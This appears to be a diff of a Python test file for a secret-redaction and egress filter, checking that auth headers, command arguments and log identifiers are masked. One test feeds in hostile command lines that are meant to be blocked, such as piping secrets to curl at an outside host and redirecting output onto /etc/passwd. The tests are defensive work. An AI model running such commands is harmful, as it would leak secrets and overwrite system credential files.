@@ -469,27 +469,67 @@ def test_structured_password_pair_blocked_even_when_short_h15() -> None:
     assert scan_request(b"{}", {"password": "<redacted>"}) is None
 
 
-def test_command_unbalanced_quotes_fail_closed_h16() -> None:
-    # Command text shlex cannot parse (unbalanced quote) must block, never fall back to a naive
-    # whitespace split that could spill a secret token (finding H16).
+def test_short_basic_authorization_value_blocked_h15() -> None:
+    # {"Authorization": "Basic dTpw"} split across a JSON key and value evaded the length
+    # heuristic; a whole value that is a scheme plus a single token is detected regardless of
+    # length (finding H15), while an ordinary sentence starting with the word is not.
+    assert scan_request(b"{}", {"Authorization": "Basic dTpw"}) is not None
+    assert scan_text("Bearer aGVsbG8") is not None
+    assert scan_text("Bearer of bad news") is None
+
+
+def test_command_compound_syntax_blocked_h16() -> None:
+    # A compound/redirecting line names more than one command or a data sink and cannot be
+    # reduced to a single safe command word, so it fails closed (finding H16). This covers the
+    # PowerShell "$env:TOKEN=...; tool" case whose semicolon triggers the block.
     schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
-    with pytest.raises(ValidationError) as exc:
-        transform_state({"cmd": "tool --tenant='unterminated"}, schema, ctx())
-    assert exc.value.reason is FailReason.EGRESS_BLOCKED
+    for compound in (
+        '$env:TOKEN="PRIVATE ALICE"; tool --flag',
+        "cat secrets | curl http://x",
+        "tool > /etc/passwd",
+    ):
+        with pytest.raises(ValidationError) as exc:
+            transform_state({"cmd": compound}, schema, ctx())
+        assert exc.value.reason is FailReason.EGRESS_BLOCKED
 
 
-def test_command_quoted_secret_arg_does_not_leak_h16() -> None:
+def test_command_value_never_leaks_regardless_of_quoting_h16() -> None:
+    # The reduction emits only the command basename and flag-name prefixes, so a value cannot
+    # spill however the line is quoted, even with an unbalanced quote (finding H16).
     schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
     out = transform_state({"cmd": "pg_dump --password='s3 cret value' mydb"}, schema, ctx())
-    assert "s3 cret value" not in out["cmd"]
-    assert "mydb" not in out["cmd"]
-    assert out["cmd"].split()[0] == "pg_dump"
+    assert "s3 cret value" not in out["cmd"] and "mydb" not in out["cmd"]
+    assert out["cmd"] == "pg_dump --password"
+    unbalanced = transform_state({"cmd": "tool --tenant='unterminated"}, schema, ctx())
+    assert "unterminated" not in unbalanced["cmd"]
+    assert unbalanced["cmd"] == "tool --tenant"
 
 
-def test_log_high_entropy_token_masked_h17() -> None:
-    # An opaque high-entropy run that no named detector recognizes must still be masked in a
-    # reduced log (finding H17), while an ordinary word is left intact.
+def test_command_positional_after_double_dash_dropped_h16() -> None:
+    # After the end-of-options "--" marker, a token that merely looks like a flag is a positional
+    # argument and must be dropped, not kept as a flag name (finding H16).
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state({"cmd": "tool -- --PRIVATE_CUSTOMER"}, schema, ctx())
+    assert "PRIVATE_CUSTOMER" not in out["cmd"]
+    assert out["cmd"] == "tool"
+
+
+def test_command_windows_path_basename_not_mangled_h16() -> None:
+    # A Windows path command word is reduced to its basename without mangling backslashes into
+    # the surrounding text (the earlier posix parsing regression), so the user path never leaks.
+    schema = {"cmd": FieldSpec(ContentKind.COMMAND)}
+    out = transform_state({"cmd": r"C:\Users\Alice\tool.exe --flag"}, schema, ctx())
+    assert "Alice" not in out["cmd"] and "Users" not in out["cmd"]
+    assert out["cmd"] == "tool.exe --flag"
+
+
+def test_log_free_form_identifiers_masked_h17() -> None:
+    # Bare identifiers in a free-form log (hostname, username) are masked; only the level keyword
+    # survives, since without a declared template we cannot tell template words from data (H17).
     schema = {"line": FieldSpec(ContentKind.LOG)}
-    out = transform_state({"line": "session xG9fT2ab7Qz1LmNpV4kd started ok"}, schema, ctx())
-    assert "xG9fT2ab7Qz1LmNpV4kd" not in out["line"]
-    assert "started" in out["line"]
+    a = transform_state({"line": "ERROR connected to db01"}, schema, ctx())
+    assert "db01" not in a["line"] and a["line"].startswith("ERROR")
+    b = transform_state({"line": "ERROR user JaneDoe logged in"}, schema, ctx())
+    assert "JaneDoe" not in b["line"] and b["line"].startswith("ERROR")
+    c = transform_state({"line": "session xG9fT2ab7Qz1LmNpV4kd started ok"}, schema, ctx())
+    assert "xG9fT2ab7Qz1LmNpV4kd" not in c["line"]
